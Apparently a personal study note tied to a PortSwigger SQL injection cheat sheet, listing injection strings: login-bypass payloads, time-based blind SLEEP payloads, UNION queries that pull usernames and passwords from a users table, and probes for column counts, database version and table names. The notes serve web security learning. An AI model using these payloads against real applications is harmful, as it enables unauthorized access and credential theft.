---

[[Export-d0ccd7da-2475-4121-b1cf-660a33b74a00/Port Swigger/Sql Injection/SQL injection cheat sheet|SQL injection cheat sheet]]

---

```Plain
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
sqs' OR '1'='1

# Time-based blind SQLi
sqs' AND SLEEP(5)--
sqs' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
```

administrator’—  
’ Union Select username , password From users—

Second order injection - stored injection

## Using UNION keyword

the already existing output and the output that this returns should be of the same type and it should return the same number of columns

to determine the number of columns - > ‘ Union select null—

to select default database -`' UNION SELECT NULL FROM DUAL--`

payload format - `' UNION SELECT 'a',NULL,NULL,NULL--`

## Identifying database Types

Select * from v$version - for oracle

  

## Database tables listing

select * from information_schema.tables

  

## Blind SQL Injection

- check for errors by using ‘

- perform time delay in operations

- out-of-band network interaction, using OAST techniques